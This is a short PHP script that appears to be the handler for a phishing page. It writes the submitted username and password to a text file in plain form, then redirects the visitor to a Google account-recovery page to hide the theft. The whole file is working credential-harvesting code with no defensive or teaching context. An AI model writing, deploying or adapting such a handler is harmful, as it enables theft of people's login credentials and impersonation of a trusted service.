<?php

file_put_contents("usernames.txt", "Username: " . $_POST['username'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.google.com/recover/initiate/');
exit();
?>
